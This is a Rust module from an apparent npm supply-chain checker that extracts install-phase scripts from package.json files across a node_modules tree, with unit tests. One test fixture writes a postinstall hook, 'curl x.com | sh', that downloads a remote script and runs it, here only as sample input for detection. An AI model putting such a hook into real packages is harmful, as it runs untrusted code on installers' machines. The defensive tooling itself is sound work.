//! npm preinstall/postinstall script preview (TASK-314).
//!
//! Walks the resolved package tree (typically what
//! [`crate::supply_chain::npm::walk`] discovered) and pulls
//! every `scripts.{preinstall,install,postinstall}` string out
//! of each `package.json`. The shell wrapper under
//! `tools/myth-npm-wrap/` calls this function before invoking
//! the real `npm install`.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NpmScriptPhase {
    Preinstall,
    Install,
    Postinstall,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct NpmScriptPreview {
    pub package_name: String,
    pub package_version: String,
    pub phase: NpmScriptPhase,
    pub command: String,
    pub manifest_path: PathBuf,
}

/// Read one `package.json` and return up to three script
/// previews (one per install-phase that is set).
pub fn preview_one(manifest_path: &Path) -> Vec<NpmScriptPreview> {
    let mut out = Vec::new();
    let Ok(body) = std::fs::read_to_string(manifest_path) else {
        return out;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) else {
        return out;
    };
    let name = json
        .get("name")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let version = json
        .get("version")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let Some(scripts) = json.get("scripts").and_then(|v| v.as_object()) else {
        return out;
    };
    for (phase, key) in [
        (NpmScriptPhase::Preinstall, "preinstall"),
        (NpmScriptPhase::Install, "install"),
        (NpmScriptPhase::Postinstall, "postinstall"),
    ] {
        if let Some(cmd) = scripts.get(key).and_then(|v| v.as_str()) {
            if !cmd.trim().is_empty() {
                out.push(NpmScriptPreview {
                    package_name: name.clone(),
                    package_version: version.clone(),
                    phase,
                    command: cmd.to_string(),
                    manifest_path: manifest_path.to_path_buf(),
                });
            }
        }
    }
    out
}

/// Mirrors [`crate::supply_chain::npm`]'s depth cap. 32 is
/// comfortably above pnpm-isolated install depths in the wild
/// (~10) and short-circuits symlink loops.
const MAX_DEPTH: usize = 32;

/// Preview every `package.json` reachable from a project root's
/// `node_modules` tree (uses the same recursive descent as the
/// installed-package walker).
pub fn preview_tree(project_root: &Path) -> Vec<NpmScriptPreview> {
    let mut out = Vec::new();
    walk(&project_root.join("node_modules"), &mut out, 0);
    out
}

fn walk(dir: &Path, out: &mut Vec<NpmScriptPreview>, depth: usize) {
    if depth > MAX_DEPTH {
        return;
    }
    let Ok(read) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in read.flatten() {
        let p = entry.path();
        let Some(name) = p.file_name().and_then(|s| s.to_str()) else {
            continue;
        };
        if name.starts_with('.') {
            continue;
        }
        let Ok(ft) = entry.file_type() else { continue };
        if ft.is_symlink() || !ft.is_dir() {
            continue;
        }
        if name.starts_with('@') {
            walk(&p, out, depth + 1);
            continue;
        }
        out.extend(preview_one(&p.join("package.json")));
        let nested = p.join("node_modules");
        if let Ok(nested_ft) = std::fs::symlink_metadata(&nested) {
            if nested_ft.is_dir() {
                walk(&nested, out, depth + 1);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn extracts_all_three_phases() {
        let dir = tempdir().unwrap();
        let m = dir.path().join("package.json");
        std::fs::write(
            &m,
            r#"{
                "name":"x",
                "version":"1.0.0",
                "scripts":{
                    "preinstall":"echo pre",
                    "install":"node-gyp build",
                    "postinstall":"echo post"
                }
            }"#,
        )
        .unwrap();
        let out = preview_one(&m);
        assert_eq!(out.len(), 3);
        assert!(out.iter().any(|s| s.phase == NpmScriptPhase::Preinstall));
        assert!(out.iter().any(|s| s.phase == NpmScriptPhase::Install));
        assert!(out.iter().any(|s| s.phase == NpmScriptPhase::Postinstall));
    }

    #[test]
    fn ignores_empty_scripts() {
        let dir = tempdir().unwrap();
        let m = dir.path().join("package.json");
        std::fs::write(
            &m,
            r#"{"name":"x","version":"1","scripts":{"preinstall":"  "}}"#,
        )
        .unwrap();
        assert!(preview_one(&m).is_empty());
    }

    #[test]
    fn preview_tree_walks_node_modules() {
        let dir = tempdir().unwrap();
        let pkg = dir.path().join("node_modules/badpkg");
        std::fs::create_dir_all(&pkg).unwrap();
        std::fs::write(
            pkg.join("package.json"),
            r#"{"name":"badpkg","version":"0.1.0","scripts":{"postinstall":"curl x.com | sh"}}"#,
        )
        .unwrap();
        let out = preview_tree(dir.path());
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].package_name, "badpkg");
        assert_eq!(out[0].phase, NpmScriptPhase::Postinstall);
    }
}
